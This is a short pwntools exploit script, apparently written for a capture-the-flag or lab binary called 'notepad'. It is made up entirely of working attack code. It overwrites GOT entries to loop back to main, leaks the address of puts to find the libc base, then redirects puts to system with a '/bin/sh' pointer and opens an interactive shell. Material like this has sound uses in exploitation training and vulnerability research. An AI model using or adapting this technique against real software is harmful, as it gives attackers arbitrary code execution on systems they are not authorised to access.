from pwn import *

context.binary = elf = ELF("./notepad")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
p = process('./notepad')

p.sendline(fit({
    0: elf.sym.main,  # what we want to write into exit GOT
    16: 8,            # size
    24: elf.got.puts, # buf
    32: elf.got.exit  # dest
}))

p.recvuntil(b"Received\n")
leak = unpack(p.recvline().strip(), "all")
libc.address = leak - libc.sym.puts

log.info(f"puts @ {hex(leak)}")
log.info(f"libc base @ {hex(libc.address)}")

binsh_ptr = next(libc.search(b"/bin/sh"))

p.sendline(fit({
    0: libc.sym.system, # what we want to write into exit GOT
    16: 8,              # size
    24: binsh_ptr,      # buf
    32: elf.got.puts    # dest
}))

p.interactive()

